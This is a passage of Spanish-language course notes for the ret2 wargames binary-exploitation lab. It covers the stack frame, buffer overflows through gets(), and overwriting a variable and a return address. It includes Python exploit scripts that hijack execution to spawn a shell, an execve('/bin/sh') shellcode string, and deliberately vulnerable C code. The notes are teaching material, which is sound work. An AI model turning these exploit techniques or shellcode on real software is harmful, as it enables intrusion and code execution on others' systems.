corrupci\u00f3n de memoria.</p> <p>Esto ya es un primitivo muy poderoso, \u00a1pero podemos llevarlo a\u00fan m\u00e1s lejos! En esta lecci\u00f3n, usaremos este concepto para tomar control de la ejecuci\u00f3n del programa. Para comenzar, ejecuta el binario y proporciona menos de 32 bytes de entrada.</p> <pre><code>ret2systems,\u00a0inc.\u00a0--\u00a09600\u00a0Baud\u00a0TTY\n\n$\u00a0wargames-gdb\u00a0-q\u00a003_return\n\nConnecting\u00a0to\u00a0remote\u00a0debugging\u00a0session...\n\nLoading\u00a0binary\u00a0'03_return'...\n\nwdb&gt;\u00a0run\n\nStarted\u00a0'03_return'\n\n------------------------------------------------------------\n\n--[\u00a0Stack\u00a0Smashing\u00a0-\u00a0Return\u00a0Address\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\n------------------------------------------------------------\n\nEnter\u00a0data:\u00a0\n\n&gt;&gt;\u00a0AAAAA\n\n------------------------------------------------------------\n\n--[\u00a0Stack\u00a0Visualization\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\n\n------------------------------------------------------------\n</code></pre> Direcci\u00f3n Contenido Descripci\u00f3n 0x7fffffffedb0 <code>41 41 41 41 41 00 00 00</code> Inicio del buffer 0x7fffffffedb8 <code>00 00 00 00 00 00 00 00</code> 0x7fffffffedc0 <code>00 00 00 00 00 00 00 00</code> 0x7fffffffedc8 <code>00 00 00 00 00 00 00 00</code> 0x7fffffffedd0 <code>00 00 00 00 00 00 00 00</code> 0x7fffffffedd8 <code>00 14 40 00 00 00 00 00</code> Valor de RBP anterior 0x7fffffffede0 <code>30 88 24 00 00 7F 00 00</code> Direcci\u00f3n de retorno <p>Nota: La pila crece hacia direcciones m\u00e1s bajas (UPWARDS).</p> <pre><code>------------------------------------------------------------\n\n====\u00a0EXECUTION\u00a0FINISHED\u00a0====\n\nwdb&gt;\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-3/return/#entendiendo-la-pila","title":"Entendiendo la Pila","text":"<p>La pila crece hacia direcciones de memoria m\u00e1s bajas. Cada vez que se llama a una funci\u00f3n, se crea un marco de pila con: - Variables locales: El buffer de 32 bytes. - El valor del registro <code>rbp</code> anterior: Para restaurar el marco de la funci\u00f3n llamadora. - La direcci\u00f3n de retorno: Indica d\u00f3nde continuar tras el retorno.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/return/#la-direccion-de-retorno_1","title":"La Direcci\u00f3n de Retorno","text":"<p>Resaltado en rojo est\u00e1 la direcci\u00f3n de retorno de <code>main()</code>.</p> <p>La direcci\u00f3n de retorno es un puntero colocado en la parte superior de la pila cada vez que se ejecuta una instrucci\u00f3n <code>call</code>. Esta direcci\u00f3n apunta a la instrucci\u00f3n inmediatamente despu\u00e9s de un <code>call</code>.</p> <p>Cuando una funci\u00f3n termina de ejecutarse, la instrucci\u00f3n <code>ret</code> saca la direcci\u00f3n de retorno de la pila y la coloca en <code>rip</code>, permitiendo que la ejecuci\u00f3n contin\u00fae como se espera.</p> <p>Veamos esto en acci\u00f3n, coloca un punto de interrupci\u00f3n en la instrucci\u00f3n <code>ret</code> en <code>main</code>, luego ejecuta el binario nuevamente.</p> <p>El programa est\u00e1 a punto de retornar desde <code>main()</code>. Presta atenci\u00f3n a la direcci\u00f3n de retorno mostrada en la visualizaci\u00f3n.</p> <p>Avancemos esta instrucci\u00f3n y veamos qu\u00e9 sucede:</p> <pre><code>wdb&gt; si\n</code></pre> <p>Nota que la direcci\u00f3n resaltada es la misma que la que est\u00e1 en la pila.</p> <p>La instrucci\u00f3n <code>ret</code> \"saca\" la palabra cu\u00e1druple superior de la pila y la coloca en el puntero de instrucci\u00f3n.</p> <p>Si te preguntas por qu\u00e9 la direcci\u00f3n parece \"extra\u00f1a\", es porque es un puntero a <code>libc_start_main</code>, la funci\u00f3n de biblioteca responsable de inicializar y ejecutar <code>main()</code>.</p> <p>Libc est\u00e1 mapeada en una regi\u00f3n de memoria diferente a nuestro binario por dise\u00f1o, por lo que los punteros a ella \"se ven diferentes\" de lo que hemos visto hasta ahora.</p> <p>La idea principal a la que queremos llegar es que puedes corromper la direcci\u00f3n de retorno de la misma manera que corrompimos las variables de la pila en la lecci\u00f3n anterior.</p> <p>Para continuar con la lecci\u00f3n, haz que el programa falle corrompiendo la direcci\u00f3n de retorno.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/return/#retorno-a-good","title":"Retorno a <code>good()</code>","text":"<p>Para finalizar el nivel, obt\u00e9n la direcci\u00f3n de <code>good()</code> del desensamblador y redirige la ejecuci\u00f3n hacia ella. Una vez que lo hayas hecho, deber\u00edas tener un shell. Usa el comando <code>cat</code> para leer el archivo de la bandera y completar el nivel.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/return/#explotando-la-direccion-de-retorno","title":"Explotando la Direcci\u00f3n de Retorno","text":"<p>La vulnerabilidad en <code>gets()</code> permite escribir m\u00e1s all\u00e1 de los 32 bytes del buffer, sobrescribiendo el RBP anterior y la direcci\u00f3n de retorno. Nuestro objetivo es sobrescribir la direcci\u00f3n de retorno con la direcci\u00f3n de <code>good()</code> (<code>0x401358</code>) para que <code>ret</code> salte a esta funci\u00f3n.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/return/#pasos-para-la-explotacion","title":"Pasos para la Explotaci\u00f3n","text":"<ol> <li>Calcular el offset:</li> <li>Buffer: 32 bytes.</li> <li>RBP anterior: 8 bytes.</li> <li>Total: 40 bytes para llegar a la direcci\u00f3n de retorno.</li> <li>Obtener la direcci\u00f3n de <code>good()</code>:</li> <li>Usando <code>gdb</code>, determinamos que <code>good()</code> est\u00e1 en <code>0x401358</code>.</li> <li>Construir el payload:</li> <li>40 bytes de relleno (por ejemplo, <code>A</code> repetidas).</li> <li>8 bytes con la direcci\u00f3n de <code>good()</code> en formato little-endian.</li> <li>Enviar el payload: Automatizamos con un script en Python.</li> </ol> <pre><code>import interact\nimport struct\n\n# Convierte un entero en 8 bytes (little-endian)\ndef p64(n):\n    return struct.pack('Q', n)\n\n# Convierte 8 bytes en un entero\ndef u64(s):\n    return struct.unpack('Q', s)[0]\n\n# Inicializa la interacci\u00f3n con el proceso\np = interact.Process()\n\n# Direcci\u00f3n de la funci\u00f3n good()\ngood_addr = 0x401358\n# Offset para llegar a la direcci\u00f3n de retorno (32 bytes buffer + 8 bytes RBP)\noffset = 40\n\n# Construye el payload: 40 bytes de relleno + direcci\u00f3n de good()\npayload = (b'A' * offset) + p64(good_addr)\n\n# Espera el prompt y env\u00eda el payload\np.readuntil(b'Enter data: ')\np.sendline(payload)\n\n# Espera la visualizaci\u00f3n de la pila\np.readuntil(b'------------------------------------------------------------\\n')\n\n# Cambia a modo interactivo para usar la shell\np.interactive()\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-3/return/#explicacion-del-script","title":"Explicaci\u00f3n del Script","text":"<ul> <li><code>p64(n)</code>: Convierte la direcci\u00f3n de <code>good()</code> (<code>0x401358</code>) en 8 bytes little-endian.</li> <li><code>offset = 40</code>: Relleno para alcanzar la direcci\u00f3n de retorno.</li> <li><code>payload</code>: 40 bytes de <code>A</code> + direcci\u00f3n de <code>good()</code>.</li> <li><code>p.readuntil()</code>: Sincroniza con el prompt del programa.</li> <li><code>p.interactive()</code>: Permite interactuar con la shell.</li> </ul>"},{"location":"bin-exploitation/ret2war-notes/level-3/return/#efecto-del-exploit-en-la-pila","title":"Efecto del Exploit en la Pila","text":"<p>Tras enviar el payload, la pila se ver\u00e1 as\u00ed:</p> Direcci\u00f3n Contenido Descripci\u00f3n 0x7fffffffedb0 <code>41 41 41 41 41 ...</code> Inicio del buffer (AAAA...) ... <code>41 41 41 41 41 ...</code> Resto del buffer 0x7fffffffedd8 <code>41 41 41 41 41 41 41 41</code> RBP anterior (sobrescrito) 0x7fffffffede0 <code>58 13 40 00 00 00 00 00</code> Direcci\u00f3n de good() <p>Al ejecutar <code>ret</code>, <code>rip</code> se carga con <code>0x401358</code>, ejecutando <code>good()</code> y abriendo una shell.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/","title":"Corrupci\u00f3n de Memoria Basada en la Pila","text":""},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#corrupcion","title":"Corrupci\u00f3n","text":""},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#corrupcion-de-memoria-basada-en-la-pila_1","title":"Corrupci\u00f3n de Memoria Basada en la Pila","text":"<p>Hemos visto c\u00f3mo deber\u00eda funcionar la pila, pero \u00bfqu\u00e9 sucede cuando un programador introduce una vulnerabilidad? Este nivel introduce el concepto de corrupci\u00f3n de memoria y muestra c\u00f3mo un atacante puede aprovechar un error para obtener control total sobre la pila.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#objetivos-de-aprendizaje","title":"Objetivos de Aprendizaje","text":"<ul> <li>Comprender el concepto de corrupci\u00f3n de memoria.</li> <li>Aprovechar vulnerabilidades para corromper y controlar variables en la pila.</li> </ul>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#introduccion","title":"Introducci\u00f3n","text":"<p>Como un lenguaje relativamente de \"bajo nivel\", C otorga a los desarrolladores acceso sin restricciones a la memoria en tiempo de ejecuci\u00f3n de su programa. Cuando un c\u00f3digo defectuoso hace que un programa acceda a la memoria incorrecta, puede ocurrir corrupci\u00f3n de memoria.</p> <p>A menudo, la corrupci\u00f3n de memoria simplemente har\u00e1 que un programa se bloquee. Pero, si se utiliza correctamente, un atacante puede usar esta corrupci\u00f3n para cambiar el comportamiento del programa y realizar acciones m\u00e1s maliciosas.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#expectativas-poco-realistas","title":"Expectativas Poco Realistas","text":"<p>Al revisar el c\u00f3digo fuente proporcionado para esta lecci\u00f3n, podemos ver que el programa entrar\u00e1 en la condici\u00f3n de \u00e9xito si la variable local <code>foo</code> se establece en el valor hexadecimal <code>0xDEADBEEF0BADC0DE</code>:</p> <pre><code>if (foo == 0xDEADBEEF0BADC0DE)\n{\n    printf(\"\u00a1Correcto!\\n\");\n    system(\"cat flag\");\n}\n</code></pre> <p>Pero, \u00bfc\u00f3mo puede esto ser cierto? La variable <code>foo</code> solo se inicializa con el valor fijo <code>0x5151515151515151</code> y no se modifica en ninguna otra parte del c\u00f3digo.</p> <pre><code>uint64_t foo = 0x5151515151515151;\n</code></pre> <p>Para un programador promedio, este binario parece presentar una condici\u00f3n imposible de cumplir. Pero para los curiosos, esto est\u00e1 lejos de ser imposible.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#desbordamiento-de-buffer","title":"Desbordamiento de Buffer","text":"<p>Algo muy interesante acaba de suceder. Tu entrada caus\u00f3 que el programa desbordara el <code>buffer</code> y corrompiera la variable <code>foo</code> cercana.</p> <pre><code>Enter data: \n&gt;&gt; \"A\" * 40 ...\n</code></pre> <p>Un desbordamiento de buffer ocurre cuando el n\u00famero de bytes copiados a un buffer excede su tama\u00f1o asignado. Los datos excedentes \"desbordar\u00e1n\" el buffer, corrompiendo la memoria adyacente.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#inicializacion-en-el-depurador","title":"Inicializaci\u00f3n en el Depurador","text":"<p>Para explicar mejor el da\u00f1o que puede causar esta corrupci\u00f3n, estudiaremos el binario a nivel de ensamblador. Comienza colocando un punto de interrupci\u00f3n en la siguiente direcci\u00f3n y vuelve a ejecutar el programa:</p> <pre><code>wdb&gt; b * 0x40172c\nwdb&gt; run \n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#inicializacion-de-foo","title":"Inicializaci\u00f3n de <code>foo</code>","text":"<p>En esta instrucci\u00f3n, podemos ver que el valor de 64 bits <code>0x5151515151515151</code> se carga en el registro <code>rax</code>. La instrucci\u00f3n que sigue inmediatamente almacenar\u00e1 este valor en la direcci\u00f3n de memoria <code>[rbp-0x8]</code>:</p> <pre><code>mov     rax, 0x5151515151515151\nmov     qword [rbp-0x8], rax\n</code></pre> <p>En la lecci\u00f3n anterior, aprendimos que <code>rbp</code> es el puntero base del marco de pila actual. Por lo tanto, estas dos instrucciones deben estar inicializando la variable local <code>foo</code> en la pila. Esto se traduce aproximadamente a la siguiente l\u00ednea de c\u00f3digo en C:</p> <pre><code>uint64_t foo = 0x5151515151515151;\n</code></pre> <p>Usa <code>si</code> para avanzar paso a paso por estas instrucciones y contin\u00faa con la lecci\u00f3n.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#acerca-de-gets","title":"Acerca de <code>gets()</code>","text":"<p>La funci\u00f3n de biblioteca <code>gets()</code> es conocida como get string. Esta funci\u00f3n es notoriamente insegura porque no hay forma de restringir cu\u00e1ntos datos leer\u00e1 en un buffer dado:</p> <pre><code>// Leer entrada del usuario desde STDIN a un buffer en la pila\nprintf(\"Enter data: \");\ngets(buffer);\n</code></pre> <p>Al usar esta funci\u00f3n insegura, el programador ha introducido inadvertidamente una vulnerabilidad en este binario. Este ejemplo cl\u00e1sico de un desbordamiento de buffer puede llevar directamente a la corrupci\u00f3n de datos en la pila.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#escritura-del-exploit","title":"Escritura del Exploit","text":"<p>Usando Python, puedes escribir un script para explotar esta vulnerabilidad.</p> <pre><code>import interact\nimport struct\n\n# Funci\u00f3n para empaquetar un n\u00famero a 8 bytes en formato little-endian\ndef p64(n):\n    return struct.pack('&lt;Q', n)\n\n# 1. El relleno para llegar hasta 'foo' (32 + 8 = 40 bytes)\npadding = b'A' * 40\n\n# 2. El valor que queremos escribir en 'foo', empaquetado con p64()\ntarget_value = p64(0xDEADBEEF0BADC0DE)\n\n# 3. El payload final es la combinaci\u00f3n de ambos\npayload = padding + target_value\n\n# --- Se env\u00eda el payload al programa ---\np = interact.Process()\np.readuntil('Enter data: ')\np.sendline(payload)\n\n# Usamos interactive() para ver la salida final del programa,\n# que incluir\u00e1 la visualizaci\u00f3n del stack y la flag.\np.interactive()\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#arquitectura-little-endian","title":"Arquitectura Little Endian","text":"<p>Recuerda que x86 es una arquitectura little-endian. Esto significa que los n\u00fameros se almacenan \"al rev\u00e9s\" en memoria:</p> <pre><code>N\u00famero de 64 bits: 0x4142434445464748\nBytes en memoria : 48 47 46 45 44 43 42 41\n</code></pre> <p>Aseg\u00farate de tener esto en cuenta al enviar tu payload. Puedes usar las funciones <code>p64</code> y <code>u64</code> para automatizar la conversi\u00f3n.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#resultado-final","title":"Resultado Final","text":"<pre><code>| Direcci\u00f3n de Memoria       | Contenido                          | Descripci\u00f3n                     |\n|----------------------------|------------------------------------|---------------------------------|\n| 0x7fffffffed90             | 01 00 00 00 00 00 00 00           | Espacio no asignado             |\n| 0x7fffffffeda0 (bar)       | 51 52 53 54 55 56 57 58           | Variable `bar`                  |\n| 0x7fffffffeda8 (buffer)    | 41 41 41 41 41 41 41 41           | Inicio del buffer               |\n| 0x7fffffffedb0             | 41 41 41 41 41 41 41 41           | Continuaci\u00f3n del buffer         |\n| 0x7fffffffedb8             | 41 41 41 41 41 41 41 41           | Continuaci\u00f3n del buffer         |\n| 0x7fffffffedc0             | 41 41 41 41 41 41 41 41           | Continuaci\u00f3n del buffer         |\n| 0x7fffffffedc8 (padding)   | 41 41 41 41 41 41 41 41           | Espacio de relleno (padding)    |\n| 0x7fffffffedd0 (foo)       | DE C0 AD 0B EF BE AD DE           | Variable `foo`                  |\n| 0x7fffffffedd8             | 00 17 40 00 00 00 00 00           | Direcci\u00f3n de retorno            |\n| ...                        | ...                                | Marco de pila anterior          |\n</code></pre> <p>Correct! flag{w3lc0m3_t0_th3_m4g1c4l_w0rld_0f_mem0ry_c0rrupt1on} <pre><code>## Entendiendo un poco m\u00e1s la pila, y el padding.\n\n\nEl relleno de 40 bytes es la **distancia exacta** que necesit\u00e1s \"viajar\" por la memoria del stack para ir desde el inicio de `buffer` hasta el inicio de `foo`. No es un n\u00famero al azar, sino la suma de dos cosas:\n1. el tama\u00f1o del propio buffer.\n2. Y un espacio de relleno que el compilador agrega.\n\n## El Mapa del Stack: buffer, padding y foo \ud83d\uddfa\ufe0f\n\nAc\u00e1 se muestra c\u00f3mo est\u00e1n ordenadas las variables en la memoria:\n</code></pre>            +---------------------------------------+  buffer --&gt;| ... (32 bytes para tu entrada) ...    |            +---------------------------------------+ (padding) -&gt;| ... (8 bytes de espacio vac\u00edo) ...    |            +---------------------------------------+     foo --&gt;| ... (8 bytes para la variable foo) ...|            +---------------------------------------+ ``` </p> <ol> <li> <p>El <code>buffer</code> (32 bytes): Es el espacio que el programa te reserva. Los primeros 32 bytes de tu payload (b'A' * 40) se usan simplemente para llenar este espacio por completo.</p> </li> <li> <p>El padding del compilador (8 bytes): Despu\u00e9s del buffer, el compilador dej\u00f3 un \"hueco\" de 8 bytes. Esto lo hace para mantener las variables alineadas a 8 bytes, (x86_64 otras arquitecturas utilizan otras alineaciones) lo que optimiza el acceso a memoria en sistemas de 64 bits. Los siguientes 8 bytes de tu payload llenan este hueco.</p> </li> <li> <p>La variable foo (8 bytes): Justo despu\u00e9s de ese relleno de 8 bytes, empieza la variable foo.</p> </li> </ol> <p>Sumando ambos tramos: 32 bytes (buffer) + 8 bytes (padding) = 40 bytes. Por eso padding = b'A' * 40 es la cantidad precisa de \"basura\" que necesit\u00e1s enviar para que el siguiente byte que escribas caiga justo en el primer byte de foo.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#la-inundacion-como-funciona-el-relleno-explicacion-para-nenes-de-doce-anos","title":"La Inundaci\u00f3n: C\u00f3mo Funciona el Relleno \ud83c\udf0a (explicaci\u00f3n para nenes de doce a\u00f1os)","text":"<p>Imagin\u00e1 que el buffer es un vaso de 32 ml y foo est\u00e1 en una mesa justo al lado. La funci\u00f3n <code>gets()</code> es como una manguera sin canilla que empieza a llenar el vaso con tu payload.</p> <p>Llenando el buffer: Los primeros 32 bytes de 'A' llenan el vaso hasta el borde.</p> <p>El Desborde: Como segu\u00eds enviando datos, los siguientes 8 bytes de 'A' se desbordan del vaso y cubren los 8 cm de mesa (el padding) que lo separan de foo.</p> <p>El Objetivo: Despu\u00e9s de 40 bytes, el \"agua\" (tus datos) est\u00e1 justo en el borde de foo. Ahora, los siguientes 8 bytes que env\u00edes <code>(p64(0xDEADBEEF0BADC0DE))</code> caer\u00e1n directamente sobre foo, cambi\u00e1ndole el valor.</p> <p>El relleno, entonces, no es para \"rellenar la pila\" en general, sino para controlar con precisi\u00f3n hasta d\u00f3nde llega tu desbordamiento y as\u00ed poder escribir el valor exacto en la ubicaci\u00f3n exacta que quer\u00e9s corromper.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#entendiendo-el-endianness","title":"Entendiendo el endianness","text":"<p>La arquitectura de tu computadora (x86) es little-endian, lo que significa que guarda los n\u00fameros de m\u00e1s de un byte en memoria \"d\u00e1ndolos vuelta\", con el byte menos significativo primero.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#que-es-endianness","title":"\u00bfQu\u00e9 es Endianness?","text":"<p>Endianness define el orden en que se almacenan en memoria los bytes que componen un n\u00famero. Existen dos tipos principales:</p> <ul> <li>Big-Endian: Guarda los bytes en el mismo orden en que los leemos. El byte m\u00e1s significativo (el de la izquierda) se guarda en la direcci\u00f3n de memoria m\u00e1s baja. Es el sistema m\u00e1s intuitivo para nosotros.</li> <li>Little-Endian: Guarda los bytes en orden inverso. El byte menos significativo (el de la derecha) se guarda en la direcci\u00f3n de memoria m\u00e1s baja. Este es el sistema que usan los procesadores Intel y AMD.</li> </ul> <p>Ejemplo con el n\u00famero 0xDEADBEEF:</p> Arquitectura Direcci\u00f3n de Memoria (baja a alta) Big-Endian DE AD BE EF Little-Endian EF BE AD DE"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-based-memory-corruption/#entonces-por-que-afecta-al-script-del-exploit","title":"Entonces, \u00bfpor que afecta al script del exploit?","text":"<p>Cuando cre\u00e1s tu payload, est\u00e1s construyendo una cadena de bytes que se escribir\u00e1 en la memoria uno por uno. Si quer\u00e9s que la variable foo contenga el n\u00famero <code>0xDEADBEEF0BADC0DE</code>, no pod\u00e9s simplemente escribir los bytes <code>DE, AD, BE, EF</code>... en ese orden. Debido a que la CPU es little-endian, ten\u00e9s que enviar los bytes en el orden en que la CPU espera leerlos de la memoria para reconstruir el n\u00famero original. Es decir, ten\u00e9s que \"darles la vuelta\" vos mismo en el payload.</p> <ul> <li>N\u00famero deseado: <code>0xDEADBEEF0BADC0DE</code></li> <li>Payload que deb\u00e9s enviar: <code>\\xDE\\xC0\\xAD\\x0B\\xEF\\xBE\\xAD\\xDE</code></li> </ul>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-frame/","title":"The Stack","text":""},{"location":"bin-exploitation/ret2war-notes/level-3/stack-frame/#que-es-la-pila","title":"\u00bfQu\u00e9 es la Pila?","text":"<p>La pila es una regi\u00f3n especial de memoria utilizada durante la ejecuci\u00f3n de programas para almacenar variables locales y metadatos relacionados con el control de flujo. Es una estructura din\u00e1mica que crece y decrece seg\u00fan las necesidades del programa.</p> <p>En esta secci\u00f3n, aprender\u00e1s c\u00f3mo funciona la pila, c\u00f3mo se asigna y libera memoria, y c\u00f3mo se utiliza para gestionar las llamadas a funciones.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-frame/#estructura-de-la-pila","title":"Estructura de la Pila","text":"<p>La pila se organiza como una secuencia de bloques de memoria llamados marcos de pila. Cada vez que se llama a una funci\u00f3n, se asigna un nuevo marco de pila para almacenar sus variables locales y otros datos necesarios.</p> <p>Cuando la funci\u00f3n termina, su marco de pila se libera autom\u00e1ticamente, devolviendo la memoria al sistema.</p> <pre><code>Ejemplo de ejecuci\u00f3n:\n\nIntroduce tu nombre: \n&gt;&gt; Juan\n\nIntroduce tu edad: \n&gt;&gt; 30\n\nVisualizaci\u00f3n de la pila:\n\n            .        espacio de pila no asignado         . /|\\\n            |                      ...                   |  |\n            +-------- 0x7fffffffed80 (RSP) ---------+    |  |\n  buffer -&gt; | 4A | 75 | 61 | 6E | 00 | 00 | 00 | 00 |    |  |\n            +---------------------------------------+    |  |\n            | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |    |  |\n            +---------------------------------------+    |  |\n            | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |    |  |\n            +---------------------------------------+    |  |\n padding -&gt; | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 |    |  |\n            +---------------------------------------+    |\n     age -&gt; | 1E | 00 | 00 | 00 | 00 | 00 | 00 | 00 |    |\n            +-------- 0x7fffffffedb0 (RBP) ---------+    |\n old RBP -&gt; | D0 | ED | FF | FF | FF | 7F | 00 | 00 |    |\n            +---------------------------------------+    |\n  return -&gt; | 4C | 18 | 40 | 00 | 00 | 00 | 00 | 00 |    |\n   addr     +---------------------------------------+    |\n            |                      ...                   |\n            .          marco de pila previo              .\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-frame/#explorando-la-pila-con-un-depurador","title":"Explorando la Pila con un Depurador","text":"<p>Para comprender c\u00f3mo se asignan y gestionan los marcos de pila, utilizaremos un depurador. Coloca un punto de interrupci\u00f3n en una funci\u00f3n de inter\u00e9s y observa c\u00f3mo se comporta la pila durante su ejecuci\u00f3n.</p> <pre><code>break nombre_de_funcion\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-frame/#prologo-de-funcion","title":"Pr\u00f3logo de Funci\u00f3n","text":"<p>El pr\u00f3logo de una funci\u00f3n es un conjunto de instrucciones que se ejecutan al inicio de la misma. Su prop\u00f3sito es preparar un nuevo marco de pila para la funci\u00f3n.</p> <pre><code>nombre_de_funcion:\n    push    rbp\n    mov     rbp, rsp\n    sub     rsp, 0x30 \n    ...\n</code></pre> <p>Estas instrucciones realizan las siguientes tareas:</p> <ol> <li>Guardan el puntero base anterior (<code>rbp</code>) en la pila.</li> <li>Establecen un nuevo puntero base (<code>rbp</code>) para el marco de pila actual.</li> <li>Reservan espacio en la pila para las variables locales de la funci\u00f3n.</li> </ol>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-frame/#puntero-de-pila-rsp","title":"Puntero de Pila (RSP)","text":"<p>El registro <code>rsp</code> apunta a la parte superior de la pila. Cada vez que se realiza una operaci\u00f3n de <code>push</code>, el puntero de pila se ajusta para reflejar la nueva asignaci\u00f3n de memoria.</p> <pre><code>push    rbp\n</code></pre> <p>Internamente, esta instrucci\u00f3n:</p> <ol> <li>Resta 8 bytes del puntero de pila (<code>rsp</code>).</li> <li>Almacena el valor de <code>rbp</code> en la nueva ubicaci\u00f3n de la pila.</li> </ol>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-frame/#puntero-base-rbp","title":"Puntero Base (RBP)","text":"<p>El registro <code>rbp</code> act\u00faa como un marcador para el inicio del marco de pila actual. Durante el pr\u00f3logo de la funci\u00f3n, el valor anterior de <code>rbp</code> se guarda en la pila, y luego se actualiza para apuntar al nuevo marco.</p> <pre><code>mov     rbp, rsp\n</code></pre> <p>Esto permite que el programa acceda f\u00e1cilmente a las variables locales y a los par\u00e1metros de la funci\u00f3n.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-frame/#asignacion-de-memoria-en-la-pila","title":"Asignaci\u00f3n de Memoria en la Pila","text":"<p>La asignaci\u00f3n de memoria en la pila es r\u00e1pida y eficiente. Para reservar espacio, simplemente se resta un valor del puntero de pila (<code>rsp</code>).</p> <pre><code>sub     rsp, 0x30\n</code></pre> <p>Esto garantiza que la memoria por encima del puntero de pila est\u00e9 disponible para su uso.</p>"},{"location":"bin-exploitation/ret2war-notes/level-3/stack-frame/#epilogo-de-funcion","title":"Ep\u00edlogo de Funci\u00f3n","text":"<p>El ep\u00edlogo de una funci\u00f3n es el conjunto de instrucciones que se ejecutan al final de la misma. Su prop\u00f3sito es liberar el marco de pila actual y devolver el control al llamador.</p> <pre><code>leave   \nretn\n</code></pre> <p>La instrucci\u00f3n <code>leave</code> realiza las siguientes operaciones:</p> <ol> <li>Restaura el puntero de pila (<code>rsp</code>) al valor del puntero base (<code>rbp</code>).</li> <li>Recupera el valor anterior de <code>rbp</code> desde la pila.</li> </ol> <p>Finalmente, la instrucci\u00f3n <code>retn</code> devuelve la ejecuci\u00f3n al llamador.</p>"},{"location":"bin-exploitation/ret2war-notes/level-4/nullfree-shellcode/","title":"Shellcode Restringido","text":"<p>A menudo, nuestro input comienza su viaje hacia el runtime de un proceso como un string estilo C. En otras ocasiones, nuestro input debe pasar varias verificaciones de formato o l\u00f3gica antes de llegar a una ubicaci\u00f3n vulnerable en el c\u00f3digo.</p> <p>Este nivel te dar\u00e1 pr\u00e1ctica navegando el proceso de shellcoding frente a una restricci\u00f3n com\u00fan: la ausencia requerida de bytes NULL.</p> <p>Resultados de Aprendizaje Familiarizarte con la modificaci\u00f3n de shellcode para cumplir restricciones contextuales</p>"},{"location":"bin-exploitation/ret2war-notes/level-4/nullfree-shellcode/#restricciones-de-bytes-null","title":"Restricciones de Bytes NULL","text":"<p>La mayor\u00eda de las funciones est\u00e1ndar de la biblioteca C que operan en strings usan el byte null (<code>0x00</code>) como terminador. Dejar\u00e1n de procesar datos una vez que encuentren un byte null.</p> <p>Esto puede ser problem\u00e1tico para el shellcode, ya que estas funciones de manipulaci\u00f3n de strings son a menudo c\u00f3mo introducimos nuestro shellcode en un proceso en ejecuci\u00f3n.</p> <p>Intenta ejecutar el shellcode a continuaci\u00f3n:</p> <pre><code>shellcode = \"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-4/nullfree-shellcode/#ensamblador-del-shellcode-original","title":"Ensamblador del Shellcode original","text":"<pre><code>xor    esi,esi\nmovabs rbx,0x68732f6e69622f\npush   rsi\npush   rbx\npush   rsp\npop    rdi\npush   0x3b\npop    rax\nxor    edx,edx\nsyscall\n</code></pre>"},{"location":"bin-exploitation/ret2war-notes/level-4/nullfree-shellcode/#codigo","title":"C\u00f3digo","text":"<pre><code>// gcc -g -I ../includes -O0 -z execstack -fno-stack-protector -no-pie -o nullfree nullfree.c\n#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n// Oculto por simplicidad\n#include &lt;wargames.h&gt;\n\nvoid main()\n{\n    init_wargame();\n\n    printf(\"------------------------------------------------------------\\n\");\n    printf(\"--[ Shellcoding - Shellcode Libre de NULL                   \\n\");\n    printf(\"------------------------------------------------------------\\n\");\n\n    // Buffer para almacenar input del usuario y shellcode\n    char buffer[512] = {};\n    char shellcode[512] = {};\n\n    // A menudo el shellcode entrar\u00e1 a un proceso como string\n    printf(\"Ingresa un string: \");\n    fgets(buffer, sizeof(buffer), stdin);\n\n    // Las funciones de string como strcpy dejar\u00e1n de copiar datos al\n    // alcanzar el primer byte NULL 